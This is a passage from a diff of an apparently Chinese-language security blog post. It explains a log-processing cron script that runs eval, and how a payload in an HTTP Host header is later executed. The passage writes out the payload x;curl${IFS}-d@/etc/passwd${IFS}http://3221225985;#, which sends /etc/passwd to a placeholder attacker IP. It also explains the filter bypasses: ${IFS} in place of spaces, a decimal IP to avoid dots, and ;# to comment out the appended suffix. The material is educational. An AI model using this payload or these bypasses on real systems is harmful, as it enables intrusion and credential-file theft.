-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">①：日志提取（把 Host 值从日志里抠出来）grep -oP <span class="hljs-string">&#x27;Host: \K[^\s]+&#x27;</span> access.log<br>    <span class="hljs-comment">#[^\s]+ = 连续的非空白字符              </span><br>    <span class="hljs-comment">#payload 里不能有空格，否则只截到第一个空格前</span><br>②：取域名首段subdomain=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> | <span class="hljs-built_in">cut</span> -d. -f1)              <br>    <span class="hljs-comment">#payload 里不能有点，否则点之后全部截断</span><br>③：payload 被展开的位置前后粘着脚本自带的固定内容grep <span class="hljs-variable">$host</span> .../access.log | <span class="hljs-built_in">wc</span> -l &gt; /stats/<span class="hljs-variable">$subdomain</span>.count<br></code></pre></td></tr></table></figure>
+<p><strong>执行流程</strong>：发一个 Host 头为该 payload 的请求 → 只在日志里留下一行记录，当下无事发生 → cron 下次运行脚本 → 变量先展开进字符串 → <strong>eval 把拼好的整串当源码重新解析</strong> → <code>;</code> 分段，curl 那段执行 → <code>/etc/passwd</code> 内容以 POST 形式到达攻击者服务器。</p>
+<h4 id="为什么-payload-要写成-x-curl-IFS-d-etc-passwd-IFS-http-3221225985"><a href="#为什么-payload-要写成-x-curl-IFS-d-etc-passwd-IFS-http-3221225985" class="headerlink" title="为什么 payload 要写成 x;curl${IFS}-d@/etc/passwd${IFS}http://3221225985;#"></a>为什么 payload 要写成 <code>x;curl$&#123;IFS&#125;-d@/etc/passwd$&#123;IFS&#125;http://3221225985;#</code></h4><p>要点：payload 不是直接进 shell 的，中间要穿过三道”剪刀”，所以它不能随便写，必须满足三个约束：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">①：日志提取（把 Host 值从日志里抠出来）grep -oP <span class="hljs-string">&#x27;Host: \K[^\s]+&#x27;</span> access.log<br>    <span class="hljs-comment">#[^\s]+ = 连续的非空白字符              </span><br>    <span class="hljs-comment">#payload 里不能有空格，否则只截到第一个空格前</span><br>②：取域名首段 subdomain=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$host</span> | <span class="hljs-built_in">cut</span> -d. -f1)              <br>    <span class="hljs-comment">#payload 里不能有点，否则点之后全部截断</span><br>③：payload 被展开的位置前后粘着脚本自带的固定内容 grep <span class="hljs-variable">$host</span> .../access.log | <span class="hljs-built_in">wc</span> -l &gt; /stats/<span class="hljs-variable">$subdomain</span>.count<br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>补充：payload 里用 <code>$&#123;IFS&#125;</code> 代替空格（shell 的内部字段分隔符，展开时等效于空格），末尾的 <code>3221225985</code> 是十进制 IP 写法，正好绕开”不能出现空格和点”两个约束。</p>
-</blockquote>
+<p>所以：空格用 <code>$&#123;IFS&#125;</code> 代替、IP 用十进制写法 <code>3221225985</code>（&#x3D;192.0.2.1）避开点号、末尾 <code>;#</code> 让自动拼上来的 <code>.count</code> 落进注释。</p>
 
                 
               </div>
